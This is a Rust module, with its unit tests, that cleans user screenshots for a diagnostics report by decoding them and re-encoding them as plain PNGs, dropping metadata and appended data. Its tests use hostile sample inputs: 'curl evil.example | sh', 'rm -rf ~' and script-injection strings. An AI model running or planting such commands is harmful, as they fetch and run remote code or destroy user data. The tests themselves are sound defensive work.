//! Screenshots the user adds to a diagnostics report. Whatever file they pick or paste is
//! decoded as a PNG or JPEG and re-encoded from its pixels alone, so what goes in the zip is
//! always a plain PNG this code wrote: anything appended to the file, hidden in its metadata
//! (EXIF, a location) or made to parse as another format is left behind. Too large ones are
//! scaled down to fit [`MAX_PNG_BYTES`].
//!
//! The diagnostics Worker checks the same shape on arrival (`workers/diagnostics/src/bundle.ts`):
//! `screenshots/<n>.png`, stored uncompressed, only the chunks [`write_png`] produces.

use super::SupportError;
use image::codecs::png::{CompressionType, FilterType as PngFilter, PngEncoder};
use image::imageops::FilterType;
use image::{DynamicImage, ImageFormat, ImageReader, Limits};
use std::io::Cursor;

/// Screenshots one report may carry.
pub const MAX_SCREENSHOTS: usize = 3;
/// The largest file accepted before decoding.
pub const MAX_INPUT_BYTES: usize = 25 * 1024 * 1024;
/// Neither side of the picture read may be longer than this (a 16K display is 15360 wide).
const MAX_INPUT_SIDE: u32 = 16_384;
/// Decoding may allocate up to this much.
const MAX_DECODE_ALLOC: u64 = 512 * 1024 * 1024;
/// The longest side kept; bigger screenshots are scaled down to it.
pub const MAX_SIDE: u32 = 2560;
/// Each cleaned PNG stays under this, so three fit the bundle with room for the logs.
pub const MAX_PNG_BYTES: usize = 1_000_000;
/// Scaling down stops here: smaller than this wouldn't show anything useful.
const MIN_SIDE: u32 = 320;

const PNG_SIGNATURE: &[u8] = b"\x89PNG\r\n\x1a\n";
const JPEG_SIGNATURE: &[u8] = &[0xff, 0xd8, 0xff];

/// A cleaned screenshot: a PNG written here, and its size in pixels.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Screenshot {
    pub png: Vec<u8>,
    pub width: u32,
    pub height: u32,
}

fn invalid(message: &str) -> SupportError {
    SupportError::Invalid(message.to_owned())
}

/// Decodes `bytes` as a PNG or JPEG (told apart by their signature, never by a file name) and
/// returns it as a fresh PNG of at most [`MAX_SIDE`] pixels a side and [`MAX_PNG_BYTES`].
/// Anything else, or a file that doesn't decode, is refused.
pub fn clean(bytes: &[u8]) -> Result<Screenshot, SupportError> {
    if bytes.len() > MAX_INPUT_BYTES {
        return Err(invalid("That image is too large. Add one under 25 MB."));
    }
    let format = if bytes.starts_with(PNG_SIGNATURE) {
        ImageFormat::Png
    } else if bytes.starts_with(JPEG_SIGNATURE) {
        ImageFormat::Jpeg
    } else {
        return Err(invalid("That isn't a screenshot. Add a PNG or JPEG image."));
    };
    let mut limits = Limits::default();
    limits.max_image_width = Some(MAX_INPUT_SIDE);
    limits.max_image_height = Some(MAX_INPUT_SIDE);
    limits.max_alloc = Some(MAX_DECODE_ALLOC);
    let mut reader = ImageReader::with_format(Cursor::new(bytes), format);
    reader.limits(limits);
    let decoded = reader.decode().map_err(|e| {
        tracing::info!(error = %e, "diagnostics screenshot refused");
        invalid("That image couldn't be read. Try another screenshot.")
    })?;
    if decoded.width() == 0 || decoded.height() == 0 {
        return Err(invalid("That image is empty."));
    }

    let pixels = plain_pixels(decoded);
    let mut side = MAX_SIDE;
    loop {
        let sized = fit(&pixels, side);
        let png = write_png(&sized)?;
        if png.len() <= MAX_PNG_BYTES {
            return Ok(Screenshot {
                png,
                width: sized.width(),
                height: sized.height(),
            });
        }
        let longest = sized.width().max(sized.height());
        if longest <= MIN_SIDE {
            return Err(SupportError::TooLarge);
        }
        side = (longest * 3 / 4).max(MIN_SIDE);
    }
}

/// 8-bit RGB, or RGBA when some pixel is see-through (a window's shadow), and nothing else:
/// no 16-bit depth, palette or grey, so the Worker has one shape to check.
fn plain_pixels(image: DynamicImage) -> DynamicImage {
    let rgba = image.into_rgba8();
    if rgba.pixels().any(|p| p[3] != u8::MAX) {
        DynamicImage::ImageRgba8(rgba)
    } else {
        DynamicImage::ImageRgb8(DynamicImage::ImageRgba8(rgba).into_rgb8())
    }
}

/// The image scaled down so its longest side is at most `side`; never scaled up.
fn fit(image: &DynamicImage, side: u32) -> DynamicImage {
    if image.width() <= side && image.height() <= side {
        image.clone()
    } else {
        image.resize(side, side, FilterType::Triangle)
    }
}

fn write_png(image: &DynamicImage) -> Result<Vec<u8>, SupportError> {
    let mut png = Vec::new();
    let encoder =
        PngEncoder::new_with_quality(&mut png, CompressionType::Best, PngFilter::Adaptive);
    image
        .write_with_encoder(encoder)
        .map_err(|e| SupportError::Internal(e.to_string()))?;
    Ok(png)
}

/// Cleans every screenshot of a report, refusing more than [`MAX_SCREENSHOTS`].
pub fn clean_all(files: &[Vec<u8>]) -> Result<Vec<Screenshot>, SupportError> {
    if files.len() > MAX_SCREENSHOTS {
        return Err(invalid("Add at most 3 screenshots."));
    }
    files.iter().map(|bytes| clean(bytes)).collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use image::{Rgb, RgbImage, Rgba, RgbaImage};

    fn encode(image: &DynamicImage, format: ImageFormat) -> Vec<u8> {
        let mut out = Cursor::new(Vec::new());
        image.write_to(&mut out, format).unwrap();
        out.into_inner()
    }

    fn sample(width: u32, height: u32) -> DynamicImage {
        DynamicImage::ImageRgb8(RgbImage::from_fn(width, height, |x, y| {
            Rgb([(x % 256) as u8, (y % 256) as u8, 128])
        }))
    }

    /// The PNG chunk types in order (`workers/diagnostics/src/bundle.ts` accepts only these).
    fn chunks(png: &[u8]) -> Vec<String> {
        let mut at = PNG_SIGNATURE.len();
        let mut out = Vec::new();
        while at < png.len() {
            let len = u32::from_be_bytes(png[at..at + 4].try_into().unwrap()) as usize;
            out.push(String::from_utf8(png[at + 4..at + 8].to_vec()).unwrap());
            at += 12 + len;
        }
        assert_eq!(at, png.len(), "nothing after IEND");
        out
    }

    #[test]
    fn a_png_comes_back_as_a_plain_png_of_the_same_pixels() {
        let original = sample(40, 30);
        let shot = clean(&encode(&original, ImageFormat::Png)).unwrap();
        assert_eq!((shot.width, shot.height), (40, 30));
        let back = image::load_from_memory(&shot.png).unwrap();
        assert_eq!(back.to_rgb8(), original.to_rgb8());
        let kinds = chunks(&shot.png);
        assert_eq!(kinds.first().map(String::as_str), Some("IHDR"));
        assert_eq!(kinds.last().map(String::as_str), Some("IEND"));
        assert!(
            kinds
                .iter()
                .all(|k| ["IHDR", "IDAT", "IEND"].contains(&k.as_str())),
            "{kinds:?}"
        );
        assert_eq!(shot.png[25], 2, "colour type RGB");
    }

    #[test]
    fn a_jpeg_becomes_a_png() {
        let shot = clean(&encode(&sample(64, 48), ImageFormat::Jpeg)).unwrap();
        assert!(shot.png.starts_with(PNG_SIGNATURE));
        assert_eq!((shot.width, shot.height), (64, 48));
    }

    #[test]
    fn see_through_pixels_keep_their_alpha() {
        let shadow = DynamicImage::ImageRgba8(RgbaImage::from_fn(8, 8, |x, _| {
            Rgba([0, 0, 0, if x < 4 { 255 } else { 40 }])
        }));
        let shot = clean(&encode(&shadow, ImageFormat::Png)).unwrap();
        assert_eq!(shot.png[25], 6, "colour type RGBA");
        assert_eq!(
            image::load_from_memory(&shot.png).unwrap().to_rgba8(),
            shadow.to_rgba8()
        );
    }

    #[test]
    fn whatever_follows_the_image_is_left_behind() {
        let mut file = encode(&sample(16, 16), ImageFormat::Png);
        let clean_size = clean(&file).unwrap().png.len();
        file.extend_from_slice(b"PK\x03\x04#!/bin/sh\ncurl evil.example | sh\n");
        let shot = clean(&file).unwrap();
        assert_eq!(shot.png.len(), clean_size);
        assert!(!shot.png.windows(4).any(|w| w == b"PK\x03\x04"));
    }

    #[test]
    fn metadata_is_dropped() {
        let mut png = Vec::new();
        let mut encoder = png::Encoder::new(&mut png, 4, 4);
        encoder.set_color(png::ColorType::Rgb);
        encoder.set_depth(png::BitDepth::Eight);
        encoder
            .add_text_chunk("Comment".into(), "GPS 51.5,-0.1".into())
            .unwrap();
        encoder
            .write_header()
            .unwrap()
            .write_image_data(&[200; 48])
            .unwrap();
        let shot = clean(&png).unwrap();
        assert_eq!(chunks(&shot.png), ["IHDR", "IDAT", "IEND"]);
    }

    #[test]
    fn anything_but_a_png_or_jpeg_is_refused() {
        for file in [
            b"#!/bin/sh\nrm -rf ~\n".to_vec(),
            b"MZ\x90\x00\x03\x00\x00\x00".to_vec(),
            b"<svg onload=alert(1)>".to_vec(),
            b"GIF89a".to_vec(),
            b"PK\x03\x04".to_vec(),
            Vec::new(),
        ] {
            assert_eq!(clean(&file).unwrap_err().code(), "invalid_input");
        }
    }

    #[test]
    fn a_broken_image_is_refused() {
        let mut png = encode(&sample(32, 32), ImageFormat::Png);
        png.truncate(60);
        assert_eq!(clean(&png).unwrap_err().code(), "invalid_input");
        let mut fake = PNG_SIGNATURE.to_vec();
        fake.extend_from_slice(b"<script>alert(1)</script>");
        assert_eq!(clean(&fake).unwrap_err().code(), "invalid_input");
    }

    #[test]
    fn a_huge_canvas_is_refused_before_decoding() {
        // A valid header claiming 100,000 × 100,000 pixels, with almost no data.
        let mut header = PNG_SIGNATURE.to_vec();
        let mut ihdr = b"IHDR".to_vec();
        ihdr.extend_from_slice(&100_000u32.to_be_bytes());
        ihdr.extend_from_slice(&100_000u32.to_be_bytes());
        ihdr.extend_from_slice(&[8, 2, 0, 0, 0]);
        header.extend_from_slice(&13u32.to_be_bytes());
        header.extend_from_slice(&ihdr);
        header.extend_from_slice(&crc32(&ihdr).to_be_bytes());
        assert_eq!(clean(&header).unwrap_err().code(), "invalid_input");
    }

    fn crc32(bytes: &[u8]) -> u32 {
        let mut crc = !0u32;
        for &b in bytes {
            crc ^= u32::from(b);
            for _ in 0..8 {
                crc = if crc & 1 == 1 {
                    (crc >> 1) ^ 0xedb8_8320
                } else {
                    crc >> 1
                };
            }
        }
        !crc
    }

    #[test]
    fn a_large_screenshot_is_scaled_to_fit() {
        let wide = sample(5120, 1440);
        let shot = clean(&encode(&wide, ImageFormat::Png)).unwrap();
        assert_eq!((shot.width, shot.height), (2560, 720));
        assert!(shot.png.len() <= MAX_PNG_BYTES);
    }

    #[test]
    fn noise_is_scaled_down_until_it_fits() {
        use rand::Rng;
        let mut rng = rand::rng();
        let mut noise = RgbImage::new(1600, 1000);
        for p in noise.pixels_mut() {
            rng.fill_bytes(&mut p.0);
        }
        let shot = clean(&encode(&DynamicImage::ImageRgb8(noise), ImageFormat::Png)).unwrap();
        assert!(shot.png.len() <= MAX_PNG_BYTES, "{}", shot.png.len());
        assert!(shot.width < 1600 && shot.width >= MIN_SIDE);
    }

    #[test]
    fn at_most_three_screenshots() {
        let one = encode(&sample(4, 4), ImageFormat::Png);
        assert_eq!(clean_all(&vec![one.clone(); 3]).unwrap().len(), 3);
        assert_eq!(
            clean_all(&vec![one; 4]).unwrap_err().code(),
            "invalid_input"
        );
    }
}
